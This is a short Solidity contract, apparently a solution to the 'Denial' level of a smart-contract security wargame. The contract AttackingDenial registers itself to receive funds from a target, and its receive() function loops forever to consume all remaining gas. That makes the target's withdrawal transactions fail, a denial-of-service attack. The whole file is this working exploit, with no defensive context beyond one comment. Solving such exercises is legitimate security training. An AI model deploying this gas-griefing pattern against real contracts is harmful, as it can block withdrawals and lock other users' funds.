// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }

    receive() external payable {
        // We can spend all the remaining gas by looping indefinitely
        // until the transaction will run out of gas.
        do {
            this;
        } while (true);
    }
}
